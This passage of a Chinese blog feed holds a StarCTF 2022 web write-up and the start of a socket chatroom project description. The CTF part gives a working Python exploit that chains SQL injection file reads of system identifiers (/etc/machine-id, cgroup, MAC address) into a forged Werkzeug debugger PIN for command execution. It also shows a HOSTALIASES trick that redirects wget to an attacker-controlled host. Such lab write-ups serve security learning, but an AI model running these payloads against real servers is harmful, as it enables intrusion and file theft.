punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>                    <span class="token string">"SOFTWARE\\Microsoft\\Cryptography"</span><span class="token punctuation">,</span>                    <span class="token number">0</span><span class="token punctuation">,</span>                    winreg<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> winreg<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">,</span>                <span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>                    guid<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span>                    guid_type<span class="token punctuation">:</span> <span class="token builtin">int</span>                    guid<span class="token punctuation">,</span> guid_type <span class="token operator">=</span> winreg<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">"MachineGuid"</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> guid_type <span class="token operator">==</span> winreg<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">:</span>                        <span class="token keyword">return</span> guid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> guid            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">pass</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    _machine_id <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> _machine_id</code></pre><p>看前两段</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">global</span> _machine_id    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _machine_id</code></pre><p>如果有了<code>_machine_id</code>就直接返回，网上第一种说法就是直接用<code>machine_id</code>生成，但是找了下这个变量的地址，在这个函数倒数第二行，<code>_machine_id = _generate()</code>，也就是说只是为了防止重复生成所以在开头写的这一段逻辑，并不是说直接用<code>machine_id</code>生成</p><p>接着往下看</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    linux <span class="token operator">=</span> <span class="token string">b""</span>    <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>    <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> value<span class="token punctuation">:</span>            linux <span class="token operator">+=</span> value            <span class="token keyword">break</span></code></pre><p>根据逻辑可知，<code>value = f.readline().strip()</code>，即这里读到了<code>/etc/machine-id</code>后就break了</p><p>继续</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Containers share the same machine id, add some cgroup</span><span class="token comment"># information. This is used outside containers too but should be</span><span class="token comment"># relatively stable across boots.</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">except</span> OSError<span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> linux<span class="token punctuation">:</span>    <span class="token keyword">return</span> linux</code></pre><p>读了<code>/proc/self/cgroup</code>，然后加了<code>/</code>后的数据，根据读到的情况有三种，分别如下</p><p><code>0::/system.slice/containerd.service    </code></p><p><code>10:memory:/docker/6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15 </code></p><p><code>5:rdma:/    </code></p><p>实际上我读的数据是根据ascii序列排序过的，实际上如下</p><img src="/article/starctf2022/image-20220421133739605.png" class="" title="image-20220421133739605" loading="lazy"><p>但即使出错也没关系，因为如果读不到<code>f.readline().strip().rpartition(b&quot;/&quot;)[2]</code>，它会pass掉，继续往下读，所以最后读到的就是<code>docker/</code>后的值，也就是<code>/etc/machine-id</code>+<code>/proc/self/cgroup</code>里<code>docker/</code>后的值</p><p>然后就利用生成脚本生成PIN码，这里注意题目还有个改动，这里利用的是sha1的update，不是md5，<code>h = hashlib.sha1()</code></p><h3 id="写了一键构造脚本如下"><a href="#写了一键构造脚本如下" class="headerlink" title="写了一键构造脚本如下"></a>写了一键构造脚本如下</h3><pre class="language-Python" data-language="Python"><code class="language-Python">&quot;&quot;&quot;-*- coding: utf-8 -*-@File: getPin.py@Author: Err0r&quot;&quot;&quot;import randomimport stringimport uuidimport requests&quot;&quot;&quot;&#x2F;etc&#x2F;machine-id1cc402dd0e11d5ae18db04a6de87223d&#x2F;proc&#x2F;self&#x2F;cgroup+---------------------------------------------------------------------------------------------+| 0::&#x2F;system.slice&#x2F;containerd.service                                                         || 10:memory:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          || 11:freezer:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15         || 12:cpuset:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          || 1:name&#x3D;systemd:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15     || 2:hugetlb:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          || 3:net_cls,net_prio:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15 || 4:perf_event:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15       || 5:rdma:&#x2F;                                                                                    || 6:pids:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15             || 7:cpu,cpuacct:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15      || 8:devices:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15          || 9:blkio:&#x2F;docker&#x2F;6c8595fc16c3b824397356dbff734dcd09090a39e99188df0f26289cf7c11f15            |+---------------------------------------------------------------------------------------------+&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_ida67fd832-a114-48c4-9ff7-161438b262dc&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address02:42:c0:a8:d0:03fuxk&quot;&quot;&quot;import hashlibfrom itertools import chainurl &#x3D; &quot;http:&#x2F;&#x2F;123.60.72.85:5002&#x2F;view&quot;session &#x3D; requests.session()cookies &#x3D; &#123;    &quot;session&quot;: &quot;eyJjc3JmX3Rva2VuIjoiNTIzYzk1ODJkMDY3YzU0Yjk5YmZjMjgyNGVlODgyYWZkNmFkZDgwOCIsInVzZXJuYW1lIjoiYTwvYT48c2NyaXB0PmFsZXJ0KDEpOzwvc2NyaXB0PjxhPiJ9.YlpCjg.o3nmen81K8VdxHDT-4lrydruCMQ&quot;&#125;def getPin(uuid, machine_id, username&#x3D;&#39;root&#39;, modname&#x3D;&#39;flask.app&#39;, className&#x3D;&#39;Flask&#39;,           file&#x3D;&#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;):    probably_public_bits &#x3D; [        username,  # username        modname,  # modname        className,  # getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))        file  # getattr(mod, &#39;__file__&#39;, None),    ]    private_bits &#x3D; [        uuid,  # str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address        machine_id  # get_machine_id(), &#x2F;etc&#x2F;machine-id    ]    h &#x3D; hashlib.sha1()    for bit in chain(probably_public_bits, private_bits):        if not bit:            continue        if isinstance(bit, str):            bit &#x3D; bit.encode(&#39;utf-8&#39;)        h.update(bit)    h.update(b&#39;cookiesalt&#39;)    cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]    num &#x3D; None    if num is None:        h.update(b&#39;pinsalt&#39;)        num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]    rv &#x3D; None    if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size &#x3D;&#x3D; 0:                rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                              for x in range(0, len(num), group_size))                break        else:            rv &#x3D; num    print(rv)    return rvdef createTable(file):    tablename &#x3D; &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 8))    paramsGet &#x3D; &#123;        &quot;note_id&quot;: f&quot;-1&#39;;create table &#123;tablename&#125;(cmd text);load data local infile &#39;&#123;file&#125;&#39; into table &#123;tablename&#125; fields terminated by &#39;\\n&#39;;\x23&quot;&#125;    res &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)    # print(tablename)    return tablenamedef readtable(tablename):    paramsGet &#x3D; &#123;&quot;note_id&quot;: f&quot;0&#39; union select 1,2,3,4,(select group_concat(concat_ws(0x7e,cmd)) from &#123;tablename&#125;)\x23&quot;&#125;    response &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)    response &#x3D; response.content.split(b&#39;&lt;h1 style&#x3D;&quot;text-align: center&quot;&gt;\n&#39;)[1].split(b&quot;\n&quot;)[0][8:]    # print(response)    return responsedef check(pin):    res &#x3D; session.get(url, cookies&#x3D;cookies).text    s &#x3D; res.split(&quot;SECRET &#x3D; \&quot;&quot;)[1].split(&quot;\&quot;;&quot;)[0]    paramsGet &#x3D; &#123;        &quot;__debugger__&quot;: &quot;yes&quot;,        &quot;cmd&quot;: &quot;pinauth&quot;,        &quot;s&quot;: s,        &quot;pin&quot;: pin    &#125;    response &#x3D; session.get(url, params&#x3D;paramsGet, cookies&#x3D;cookies)    print(response.text)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    getmac &#x3D; createTable(&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;)    getmac &#x3D; str(int(readtable(getmac).decode().replace(&quot;:&quot;, &quot;&quot;), 16))    print(getmac)    getCgroup &#x3D; createTable(&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;)    getCgroup &#x3D; str(readtable(getCgroup).decode().split(&quot;&#x2F;&quot;)[2].split(&quot;,&quot;)[0])    print(getCgroup)    getMachineId &#x3D; createTable(&quot;&#x2F;etc&#x2F;machine-id&quot;)    getMachineId &#x3D; str(readtable(getMachineId).decode())    print(getMachineId)    getBootId &#x3D; createTable(&quot;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id&quot;)    getBootId &#x3D; str(readtable(getBootId).decode())    print(getBootId)    # etcPasswd &#x3D; createTable(&quot;&#x2F;etc&#x2F;passwd&quot;)    # etcPasswd &#x3D; str(readtable(etcPasswd).decode()).split(&quot;,&quot;)    # users &#x3D; []    # for i in etcPasswd:    #     users.append(i.split(&quot;:&quot;)[0])    # print(users)    users &#x3D; [&#39;ctf&#39;]    for i in users:        print(i)        # pin1 &#x3D; getPin(getmac, getMachineId, username&#x3D;i)        # check(pin1)        #        # pin2 &#x3D; getPin(getmac, getCgroup, username&#x3D;i)        # check(pin2)        # pin3 &#x3D; getPin(getmac, getBootId+getCgroup, username&#x3D;i)        # check(pin3)        pin4 &#x3D; getPin(getmac, getMachineId+getCgroup, username&#x3D;i)        check(pin4)</code></pre><img src="/article/starctf2022/(null)-20220421125559691.(null)" class="" title="img" loading="lazy"><p>拿到pin码解锁，然后执行命令</p><img src="/article/starctf2022/(null)-20220421125600275.(null)" class="" title="img" loading="lazy"><p>根目录执行&#x2F;readflag</p><img src="/article/starctf2022/(null)-20220421125559899.(null)" class="" title="img" loading="lazy"><hr><h2 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h2><p>下载附件审计源码可以发现一个文件上传，保存为 <code>/app/guess/forecast.txt</code>。同时在通过如下 check 的情况下可以设置环境变量。</p><pre class="language-Python" data-language="Python"><code class="language-Python">def safe_check(s):    if &#39;LD&#39; in s or &#39;HTTP&#39; in s or &#39;BASH&#39; in s or &#39;ENV&#39; in s or &#39;PROXY&#39; in s or &#39;PS&#39; in s:         return False    return True</code></pre><p>设定好环境变量后执行如下逻辑。</p><pre class="language-Python" data-language="Python"><code class="language-Python">try:    os.system(&#39;wget --content-disposition -N lotto&#39;)    if os.path.exists(&quot;&#x2F;app&#x2F;lotto_result.txt&quot;):        lotto_result &#x3D; open(&quot;&#x2F;app&#x2F;lotto_result.txt&quot;, &#39;rb&#39;).read()    else:        lotto_result &#x3D; &#39;result&#39;    if os.path.exists(&quot;&#x2F;app&#x2F;guess&#x2F;forecast.txt&quot;):        forecast &#x3D; open(&quot;&#x2F;app&#x2F;guess&#x2F;forecast.txt&quot;, &#39;rb&#39;).read()    else:        forecast &#x3D; &#39;forecast&#39;    if forecast &#x3D;&#x3D; lotto_result:        return flag    else:        message &#x3D; &#39;Sorry forecast failed, maybe lucky next time!&#39;        return render_template(&#39;lotto.html&#39;, message&#x3D;message)except Exception as e:    message &#x3D; &#39;Lotto Error!&#39;    return render_template(&#39;lotto.html&#39;, message&#x3D;message)</code></pre><p>wget 处采用了 hostname 的方式，此时只要劫持到 lotto 即可实现任意文件下载。因此设置环境变量如下。</p><pre class="language-Bash" data-language="Bash"><code class="language-Bash">HOSTALIASES&#x3D;&#x2F;app&#x2F;guess&#x2F;forecast.txt</code></pre><img src="/article/starctf2022/(null)-20220421125601129.(null)" class="" title="img" loading="lazy"><p>将文件内容设置如下。</p><pre class="language-CSS" data-language="CSS"><code class="language-CSS">lotto lottod.lemonprefect.cn</code></pre><img src="/article/starctf2022/(null)-20220421125600612.(null)" class="" title="img" loading="lazy"><p>此时 lotto 的解析即可被劫持到 <code>lottod.lemonprefect.cn</code>。将如下 nginx 反代配置好。</p><pre class="language-Nginx" data-language="Nginx"><code class="language-Nginx">server    &#123;        listen 80;        #listen [::]:80;        server_name lottod.lemonprefect.cn lotto;        index index.html index.htm index.php default.html default.htm default.php;        root  &#x2F;home&#x2F;wwwroot&#x2F;lottod.lemonprefect.cn;        location &#x2F;        &#123;                proxy_pass http:&#x2F;&#x2F;localhost:8068;        &#125;        location ~ &#x2F;.well-known &#123;            allow all;        &#125;        location ~ &#x2F;\.        &#123;            deny all;        &#125;        access_log  &#x2F;home&#x2F;wwwlogs&#x2F;lottod.lemonprefect.cn.log;    &#125;</code></pre><p>在对应端口运行如下程序。</p><pre class="language-Python" data-language="Python"><code class="language-Python">from flask import Flask, make_responseimport secretsapp &#x3D; Flask(__name__)@app.route(&quot;&#x2F;&quot;)def index():    r &#x3D; &quot;lotto lottod.lemonprefect.cn&quot;    response &#x3D; make_response(r)    response.headers[&#39;Content-Type&#39;] &#x3D; &#39;text&#x2F;plain&#39;    response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;lotto_result.txt&#39;    return responseif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(debug&#x3D;True, host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8068)</code></pre><p>即可同时达成劫持与内容相等，获得 flag。</p><img src="/article/starctf2022/(null)-20220421125559634.(null)" class="" title="img" loading="lazy"><hr><p>其他方向的题目由于我没做就不写啦</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Socket网络通信编程项目</title>
      <link href="article/socket/"/>
      <url>article/socket/</url>
      
        <content type="html"><![CDATA[<p>基于多种编程语言组成的聊天室系统</p><span id="more"></span><h2 id="Socket网络通信编程项目"><a href="#Socket网络通信编程项目" class="headerlink" title="Socket网络通信编程项目"></a>Socket网络通信编程项目</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>为深入研究socket编程，本人开发应用了一套socket通信编程项目，旨在深入学习其原理和实现方法。本人独立实现了方案一，并参与帮助完成了方案二。</p><h3 id="项目功能简介"><a href="#项目功能简介" class="headerlink" title="项目功能简介"></a>项目功能简介</h3><p>本项目实现网络聊天室的功能，可以进行多人在线聊天，自定义昵称并记录历史记录和发言时间。利用socket编程，多线程和队列，能够使得任意加入server的客户端进行通信，其中服务端模块用Python语言在Linux系统上完成开发，而客户端模块用Go语言在Windows系统上完成开发，系统具有跨平台跨语言分布特性。其中在认证方面还设计了RSA加密，以保证认证通信的保密性。</p><p>项目链接：<a href="https://err0r.top/article/socket/">https://err0r.top/article/socket/</a></p><h3 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h3><p>方案一：项目包括客户端和服务端两个部分，其中服务端模块用Python语言在Linux系统上完成开发，而客户端模块用Go语言在Windows系统上完成开发，系统具有跨平台跨语言分布特性。</p><p>方案二：项目包括客户端和服务端两个部分，其中服务端模块用C语言在Linux系统上完成开发，而客户端模块用Python语言在Windows系统上完成开发，系统具有跨平台跨语言分布特性。</p><h3 id="项目实现"><a href="#项目实现" class="headerlink" title="项目实现"></a>项目实现</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><p>程序流程图</p><img src="/article/socket/image-20220323201658269.png" class="" title="image-20220323201658269" loading="lazy"><p>在Linux操作系统中，运行server.py程序，可以启动服务端，在Windows操作系统中，再运行goClient.exe程序，可以启动客户端。在弹出的聊天室窗口输入服务端IP和端口，若输入正确则服务端连接成功并打印“conn success！”，若输入错误则窗口消失。在服务端连接成功后，输入用户名则可以开始聊天，在聊天窗口输入histroy，则可以查看所以历史记录。</p><p>服务端窗口：</p><img src="/article/socket/server.png" class="" title="server" loading="lazy"><p>客户端窗口：</p><img src="/article/socket/client1.png" class="" title="client1" loading="lazy"><img src="/article/socket/client2.png" class="" title="client2" loading="lazy"><h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><p>在Linux操作系统中，运行netdemo.c程序，可以启动服务端，在Windows操作系统中，再运行test2.py程序，可以启动客户端。在服务端和客户端启动成功后，输入用户名登录成功后则可以开始聊天。</p><p>服务端窗口：</p><img src="/article/socket/TU4-0760934.png" class="" title="TU4" loading="lazy"><p>客户端登录窗口：</p><img src="/article/socket/TU1.png" class="" title="TU1" loading="lazy"><p>客户端登录成功：</p><img src="/article/socket/TU2-0761014.png" class="" title="TU2" loading="lazy"><p>聊天窗口：</p><img src="/article/socket/TU3.png" class="" title="TU3" loading="lazy"><h3 id="代码结构说明"><a href="#代码结构说明" class="headerlink" title="代码结构说明"></a>代码结构说明</h3><p>各函数名称和所实现功能列表如下：</p><h4 id="方案一：-1"><a href="#方案一：-1" class="headerlink" title="方案一："></a>方案一：</h4><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>rsa_decrypt()</td><td>用于rsa解密</td></tr><tr><td>rsa_encrypt()</td><td>用于rsa加密</td></tr><tr><td>printStackTrace()</td><td>用于debug调试，输出错误信息</td></tr><tr><td>vertify()</td><td>用于认证模块</td></tr><tr><td>game()</td><td>主流程模块</td></tr><tr><td>thread_task()</td><td>线程任务</td></tr><tr><td>socket_task()</td><td>套接字处理</td></tr><tr><td>init_Thread()</td><td>线程初始化</td></tr><tr><td>init_Process()</td><td>进程初始化</td></tr></tbody></table><h4 id="方案二：-1"><a href="#方案二：-1" class="headerlink" title="方案二："></a>方案二：</h4><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>login_socket()</td><td>客户端与服务端进行socket连接</td></tr><tr><td>ChatUI()</td><td>聊天窗口UI</td></tr><tr><td>sendMsgEvent()</td><td>实现回车登录或发送消息</td></tr><tr><td>senddata()</td><td>发送数据</td></tr><tr><td>recvdata()</td><td>接收数据</td></tr><tr><td>close()</td><td>关闭程序</td></tr></tbody></table><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="方案一：-2"><a href="#方案一：-2" class="headerlink" title="方案一："></a>方案一：</h4><p>在实现rsa解密功能时，借助了rsa_decrypt()函数，关键代码为：  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rsa_decrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""校验RSA加密 使用私钥进行解密"""</span>    private_key <span class="token operator">=</span> <span class="token triple-quoted-string string">'''私钥，略'''</span>    cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span><span class="token punctuation">)</span>    retval <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'ERROR'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retval<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment"># 去除换行符</span></code></pre><p>在实现rsa加密功能时，借助了rsa_encrypt()函数，关键代码为：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rsa_encrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    PUBLIC_KEY <span class="token operator">=</span> <span class="token triple-quoted-string string">'''公钥，略'''</span>    cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>PUBLIC_KEY<span class="token punctuation">)</span><span class="token punctuation">)</span>    cipher_text <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> cipher_text<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span></code></pre><p>在实现debug调试，输出错误信息功能时，借助了printStackTrace(函数，关键代码为：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">printStackTrace</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> current_name<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        info <span class="token operator">=</span> <span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>current_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" Error: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nat "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>            e<span class="token punctuation">.</span>__traceback__<span class="token punctuation">.</span>tb_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__file__"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nat line: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>__traceback__<span class="token punctuation">.</span>tb_lineno<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>        <span class="token comment"># 写入文件</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"logs.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> logger<span class="token punctuation">:</span>            logger<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span></code></pre><p>连接建立后，需要对用户进行认证，这里接收用户名后利用rsa解密，解密成功即使用了正确的客户端，否则服务端会断开于客户端的连接</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">vertify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket_handle<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    前段略    """</span>        name <span class="token operator">=</span> socket_handle<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> self<span class="token punctuation">.</span>rsa_decrypt<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s has entered!"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 防止并发错误</span>        lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 写入消息和历史记录</span>        history<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"[!] "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":has entered!"</span><span class="token punctuation">)</span>        tmp_message<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span> <span class="token string">"view_names"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"[!] "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">":has entered!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 认证完成后接入主聊天流程</span>        self<span class="token punctuation">.</span>game<span class="token punctuation">(</span>socket_handle<span class="token punctuation">,</span> name<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># 出错说明认证失败，断开连接</span>        socket_handle<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"\n[-] Please use the authentication client to connect!"</span><span class="token punctuation">)</span>        socket_handle<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token 